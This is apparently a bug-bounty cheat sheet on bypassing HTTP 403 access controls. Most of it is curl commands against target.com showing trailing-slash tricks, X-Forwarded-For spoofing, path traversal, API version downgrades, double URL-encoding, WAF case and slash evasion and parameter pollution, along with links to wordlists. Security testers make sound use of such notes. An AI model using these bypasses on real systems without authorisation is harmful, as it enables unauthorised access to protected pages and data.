---
tags:
  - Attack
  - Bugs/403-bypass
---
curl 'https://target.com/secret/admin' - 403
curl 'https://target.com/secret/admin/' - 200
              **OR**                              
curl 'https://target.com/secret/admin/' - 403
curl 'https://target.com/secret/admin' - 200

curl -H 'X-FORWARDED-FOR: 127.0.0.1' http://target.com/secret

curl 'https://target.com/secret/admin' - 403
curl 'https://target.com/secret/./admin' - 404 (can be bruteforced if 404 to find dir)
curl 'https://target.com/secret/./pass' - 200

curl 'https://target.com/admin' - 403
curl 'https://target.com/secure/../admin' -200

curl 'https://target.com/v2/users/7503' - 403
curl 'https://target.com/v1/users/7503' - 200
**(Could be v1.1,v1.5)**

curl 'https://target.com/admin%2f' %2f -> /
curl 'https://target.com/admin%252f' %25 -> %
curl 'https://target.com/admi%6E' %6E -> n
curl 'https://target.com/admi%256E'

Windows Server(e.g: IIS Server)
curl 'https://target.com///admiN/'
-  The Waf might be looking for string '/admin'
-  Adding '///' will break the condition and won't trigger 403.
-  In Windows directory's are not case sensetive. making random letters uppercase will not trigger 403.

---
https://youtu.be/GN_QbdNHq7E?si=3Z9ngMgRq_eTIVQd

##### Method 1:
Try changing Http method of the Request.
use this wordlist: https://github.com/OWASP/AppSec-Browser-Bundle/blob/master/utilities/wfuzz/wordlist/fuzzdb/attack-payloads/http-protocol/http-protocol-methods.txt

##### Method 2:
try: https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20403.md

##### Method 3:
Url-encode the slash(/) -> %2f
Or anyother things..

##### Method 4: 
Parameter pollution
if 
**GET /api/user?id=123**
-> **GET /api/user?id=123&id=123**
